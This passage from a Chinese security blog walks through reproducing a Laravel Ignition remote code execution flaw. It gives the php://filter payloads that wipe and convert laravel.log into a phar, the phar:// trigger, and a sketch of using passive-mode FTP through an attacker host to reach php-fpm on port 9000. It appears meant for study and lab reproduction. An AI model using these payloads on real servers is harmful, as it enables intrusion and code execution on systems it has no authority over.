payload.txt</span><br></pre></td></tr></table></figure><p>清空 log 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=consumed/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171400644.png" alt="image-20210212171400644" style="zoom:80%;" /><p>发送无害 payload ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AA</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171447028.png" alt="image-20210212171447028" style="zoom:80%;" /><p>将第一步构造好的 payload 发送（注意末尾的 <code>a</code> 是我们前面添加的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=50=00=44=00=39=00=77=00=61=00=48=00=41...=00=43=00=54=00=55=00=49=00=3D=00a</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171611206.png" alt="image-20210212171611206" style="zoom:80%;" /><p>转换文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171713560.png" alt="image-20210212171713560" style="zoom:80%;" /><p>注意转换文件这步一定要无返回信息，如果有错误，说明前几步根本没到位。</p><p>此时的 log 文件一定只有一条完整的 payload ，也就是纯净的 phar 文件：</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171845633.png" alt="image-20210212171845633"></p><p>伪协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://../storage/logs/laravel.log/test.txt</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212172002140.png" alt="image-20210212172002140" style="zoom:80%;" /><p>利用成功。</p><p>我们安装的 docker 环境自带有 exp 脚本，github 上也有很多如一键 getshell 的优秀脚本，建议阅读实践，可以参考<a href="https://blog.csdn.net/qq_41832837/article/details/113410247?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&spm=1001.2101.3001.4242">这个博客</a>尝试运行，也可以试着自写脚本添加更多链生成的 payload ，增强通杀能力。</p><h3 id="漏洞拓展"><a href="#漏洞拓展" class="headerlink" title="漏洞拓展"></a>漏洞拓展</h3><p>让我更感兴趣的是作者提出的另一个思路：使用 ftp 同 php-fpm 对话。</p><p>经过上面的漏洞分析，我们知道我们可以通过 <code>file_put_contents()</code> 写入任意数据至 log 文件，然后经 <code>file_get_contents()</code> 读回，作者利用这向目标发出 http 请求扫描了通用端口，并发现 php-fpm 在监听端口 9000 。</p><blockquote><p>php-fpm</p><p>php-fastcgi 进程管理器，用于管理 php 进程池的软件，用于接受 web 服务器的请求，它会创建一个主进程，控制何时以及如何将http 请求转发给一个或多个子进程处理。</p><p>php-fpm 主进程还控制着什么时候创建（处理Web应用更多的流量）和销毁（子进程运行时间太久或不再需要了）PHP子进程。</p><p>php-fastcgi 只是一个 cgi 程序，只会解析 php 请求，并且返回结果，不会管理 （因此才出现的 php-fpm）。</p></blockquote><p>综上，也就是说，如果可以向 php-fpm 服务发送任意二进制数据包，就可以在机器上执行代码。这种技术通常与 <code>gopher://</code> 协议配合使用，后者由 curl 支持，但 php 不支持。</p><p>所以我们需要找到另一个能让我们发送二进制数据包的协议，那就是被动模式下的 ftp ，它可以通过 tcp 连接发送。如果客户机想从 ftp 服务器上读取 / 写入一个文件，ftp 服务器会告诉客户机从某个特定 IP 和端口进行文件操作，IP 和端口并无限制，例如服务器自己的端口。</p><p>那么如何使用 ftp 同 php-fpm 对话进行漏洞利用呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://evil-server.lexfo.fr/file.txt</span><br></pre></td></tr></table></figure><p>我们使用 ftp 协议的被动模式让 <code>file_get_contents()</code> 在我们的服务器上下载一个文件，当它尝试使用 <code>file_put_contents()</code> 上传文件时，我们让它将文件发送到 127.0.0.1:9000 ，也就是 php-fpm 。</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/6.png" alt="6"></p><p>图源自原作者博客。</p><p>这样就能发送任意二进制数据包，RCE 。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结一下知识点：</p><ul><li><p>phar 反序列化 RCE</p><p>如果有不了解可以参照这篇文章，非常精简易懂：</p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p></li><li><p>php://filter 多个过滤器配合妙用</p><p>这个知识点墙裂推荐阅读 p 神的这篇文章：</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>同时这个原作者也提到过 orange 大神出的 hitcon ctf 2018 One Line PHP Challenge 这道题，也用了过滤器，可以阅读一下 wp 学习。</p></li><li><p>使用 ftp 同 php-fpm 对话</p><p>这个可以参考 hxp-2020 的 resonator 这道题。</p></li></ul><p>感谢你能阅读到这，希望我写得足够清晰，能帮助到你理解这个漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> PHP代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Laravel </tag>
            
            <tag> 远程代码执行漏洞 </tag>
            
            <tag> Ignition </tag>
            
            <tag> phar反序列化 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
